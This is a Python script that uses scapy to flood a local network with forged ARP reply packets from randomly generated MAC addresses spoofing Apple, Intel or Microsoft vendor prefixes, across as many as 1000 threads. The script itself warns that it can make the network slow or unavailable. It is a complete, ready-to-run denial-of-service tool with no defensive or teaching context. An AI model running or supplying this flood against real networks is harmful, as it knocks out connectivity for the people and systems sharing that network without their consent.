#!/usr/bin/env python

import random
import sys
import threading
import os
import time
from scapy.all import *

DestMAC = "FF:FF:FF:FF:FF:FF" # broadcast MAC address

MACprefix = 'b8:e8:56' # Apple inc prefix
#MACprefix = '00:1B:21' # Intel Corporate prefix
#MACprefix = '00:15:5D' # Microsoft prefix

packetCount = 0
stop_event = threading.Event()

def check_root():
    if os.geteuid() != 0:
        print("Script must run as root")
        sys.exit(1)

def generateRandomMacFull():
    mac = ""
    for i in range(6):
        digit = hex(random.randint(0, 255))[2:]
        if len(digit) == 1:
            digit = "0" + digit
        mac += digit + ":"
    return mac[:-1]

def generateRandomMac():
    mac = MACprefix  # Начинаем с префикса
    for i in range(3):  # Генерируем оставшиеся 3 байта
        digit = hex(random.randint(0, 255))[2:]
        if len(digit) == 1:
            digit = "0" + digit
        mac += ":" + digit
    return mac

def sendPacket(sourceMac, destinationMac):
    global packetCount
    sendp(Ether(src=sourceMac, dst=destinationMac) /
          ARP(op=2, psrc="0.0.0.0", hwdst=destinationMac) /
          Padding(load="X"*18), verbose=False)
    packetCount += 1
    print("Packets: " + str(packetCount))

def floodMac():
    while not stop_event.is_set():
        try:
            sendPacket(generateRandomMac(), DestMAC)
        except Exception as e:
            print(f"An error occurred: {e}")

def startThreads(threads):
    for i in range(threads):
        t = threading.Thread(target=floodMac)
        t.daemon = False
        t.start()

def main():
    try:
        check_root()
        print("The script can make the network slow/unavailable")
        print("To stop press CTRL+C")

        while True:
            threads_input = input(f"\nEnter number of Threads (1-1000): ")
            try:
                threads = int(threads_input)
                if threads < 1 or threads > 1000:
                    print("Please enter a valid number of threads between 1 and 1000.")
                else:
                    break
            except ValueError:
                print("Invalid input. Please enter a number.")
        startThreads(threads)
        while True:
            time.sleep(1)
        
    except KeyboardInterrupt:
        print("\nStopping the script...")
        stop_event.set()
    finally:
        for t in threading.enumerate():
            if t is not threading.current_thread():
                t.join()
        print("Script has been stopped.")


if __name__ == "__main__":
    main()